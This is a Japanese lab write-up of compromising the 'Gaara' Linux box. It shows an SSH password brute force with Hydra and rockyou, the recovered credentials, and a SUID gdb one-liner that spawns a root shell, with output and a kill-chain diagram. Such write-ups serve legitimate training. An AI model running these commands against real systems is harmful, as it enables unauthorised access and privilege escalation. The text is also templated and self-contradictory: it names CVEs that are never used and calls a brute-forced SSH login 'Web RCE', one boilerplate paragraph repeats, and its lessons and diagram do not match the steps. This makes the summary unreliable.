## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Web application and exposed network services |
| 主な侵入経路 | Web RCE (CVE-2019-13272, CVE-2021-3156) |
| 権限昇格経路 | Local enumeration -> misconfiguration abuse -> root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## 初期足がかり

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://$ip
```

```bash
✅[23:26][CPU:19][MEM:65][TUN0:192.168.45.180][/home/n0z0]
🐉 > hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://$ip
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-02 23:26:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344403 login tries (l:1/p:14344403), ~896526 tries per task
[DATA] attacking ssh://192.168.104.142:22/
[22][ssh] host: 192.168.104.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-02 23:27:44

```

Retrieved local.txt:
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat local.txt
```

```bash
gaara@Gaara:~$ cat local.txt
60cc7cb22aab62b4218ae745d329f55b
```

💡 なぜ有効か  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb

```

https://gtfobins.org/gtfobins/gdb/#shell
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

```bash
gaara@Gaara:/tmp$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".

```

💡 なぜ有効か  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

### Attack Flow

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。



```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>偵察"]
        direction TB
        K1A[ポートスキャン<br/>Rustscan/Nmap]
        K1B[オープンポート発見<br/>22/SSH, 80/HTTP]
        K1C[サービス特定<br/>OpenSSH 7.9p1<br/>Apache 2.4.38]
        K1D[OSバージョン<br/>Debian 10 Buster]
        
        K1A --> K1B --> K1C --> K1D
    end
    
    subgraph KC2["Kill Chain 2<br/>Web列挙"]
        direction TB
        K2A[feroxbuster実行<br/>directory-list-2.3-big.txt]
        K2B[基本ファイル発見<br/>index.html<br/>gaara.jpg]
        K2C[dirsearch実行<br/>追加列挙]
        K2D[結果乏しい<br/>.htaccess系のみ]
        
        K2A --> K2B --> K2C --> K2D
    end
    
    subgraph KC3["Kill Chain 3<br/>画像解析"]
        direction TB
        K3A[gaara.jpg取得<br/>wget download]
        K3B[binwalk実行<br/>埋め込みJPEG検出]
        K3C[exiftool実行<br/>メタデータ確認]
        K3D[steghide失敗<br/>stegseek with rockyou]
        
        K3A --> K3B --> K3C --> K3D
    end
    
    subgraph KC4["Kill Chain 4<br/>パスワード探索"]
        direction TB
        K4A[HTMLソース確認<br/>隠し情報なし]
        K4B[隠しディレクトリ推測<br/>LinPEAS結果活用]
        K4C[4つのパス発見<br/>iamGaara/Temari<br/>Cryoserver/Kazekage]
        K4D[SSH認証情報推測<br/>ユーザー名:gaara]
        
        K4A --> K4B --> K4C --> K4D
    end
    
    subgraph KC5["Kill Chain 5<br/>初期侵入"]
        direction TB
        K5A[hydra準備<br/>rockyou.txt]
        K5B[SSH bruteforce<br/>-l gaara -P rockyou.txt]
        K5C[認証情報発見<br/>gaara:iloveyou2]
        K5D[SSH接続確立<br/>ssh gaara@target]
        
        K5A --> K5B --> K5C --> K5D
    end
    
    subgraph KC6["Kill Chain 6<br/>ローカルシェル"]
        direction TB
        K6A[シェル確立<br/>uid=1001 gaara]
        K6B[local.txt取得<br/>/home/gaara/local.txt]
        K6C[フラグ確認<br/>60cc7cb22aab...]
        K6D[列挙準備<br/>LinPEAS転送]
        
        K6A --> K6B --> K6C --> K6D
    end
    
    subgraph KC7["Kill Chain 7<br/>システム列挙"]
        direction TB
        K7A[LinPEAS実行<br/>権限昇格ベクター]
        K7B[CVE検出<br/>CVE-2019-13272<br/>CVE-2021-3156]
        K7C[SUID発見<br/>gdb SUID/SGID<br/>-rwsr-sr-x root:root]
        K7D[sudo確認<br/>sudo version 1.8.27]
        
        K7A --> K7B --> K7C --> K7D
    end
    
    subgraph KC8["Kill Chain 8<br/>権限昇格試行"]
        direction TB
        K8A[gdb SUID悪用<br/>GTFOBins参照]
        K8B[Python経由実行<br/>os.execl with -p flag]
        K8C[コマンド実行<br/>gdb -nx -ex 'python...]
        K8D[特権シェル取得<br/># プロンプト]
        
        K8A --> K8B --> K8C --> K8D
    end
    
    subgraph KC9["Kill Chain 9<br/>目標達成"]
        direction TB
        K9A[rootシェル確立<br/>SUID保持成功]
        K9B[proof.txt取得<br/>/root/proof.txt]
        K9C[フラグ確認<br/>034680261c13...]
        K9D[完了<br/>Mission Success]
        
        K9A --> K9B --> K9C --> K9D
    end
    
    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8 ==> KC9
    
    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#ffe0b2
    style KC8 fill:#ff9800
    style KC9 fill:#4caf50
    style K8D fill:#ff6b6b,color:#fff
    style K9D fill:#2196f3,color:#fff
```

## 参考文献

- CVE-2019-13272: https://nvd.nist.gov/vuln/detail/CVE-2019-13272
- CVE-2021-3156: https://nvd.nist.gov/vuln/detail/CVE-2021-3156
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
